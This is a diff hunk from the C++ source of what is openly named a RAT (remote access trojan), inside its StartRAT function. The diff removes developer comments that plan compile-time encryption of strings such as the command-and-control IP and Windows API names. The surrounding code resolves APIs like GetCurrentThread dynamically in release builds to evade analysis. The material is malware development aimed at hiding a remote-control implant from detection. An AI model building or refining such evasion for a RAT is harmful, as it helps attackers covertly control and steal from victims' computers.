@@ -19,18 +19,6 @@ typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(
 
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
-	// consider using a single key, using multiple keys adds additional overhead (and huge performance downside), which is not a priority right now..	
-	// here's one idea: generate one global key (in string_encryption.h), and use it. 
-	// where you think it is better having a unique key, generate a new one in the specific context
-	// with the global key: use a macro that returns the string after reencrypted and decrypted with the global key. after, we can always call the funcs manually if needed to reencrypt for example (or just reencrypt again with a new key, idk, doesn't matter.)
-	// with the unique key: use an inline function (or macro possibly?) that gets the key generated, the string literal, reencrypts the string and returns the decrypted string
-	// basically when using the macro or the inline function - we always reencrypt. then we perform the steps (e.g reencrypting afterwards or wiping the strings value) as we wish.
-
-
-	// ok listen so its like this:
-	// define all strings with compile_time_encrypt()
-	// create wrappers that where needed, you just call it like this:  TCPClient* conn = new TCPClient(arrayToString(str_ip_encrypt), 54000);
-	// or in the resolve_dynamically: resolve_dynamically<GetCurrentThread_t>(arrayToCStr(str_GetCurrentThread_encrypt));
 
 #ifndef _DEBUG
 	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(str_GetCurrentThread);
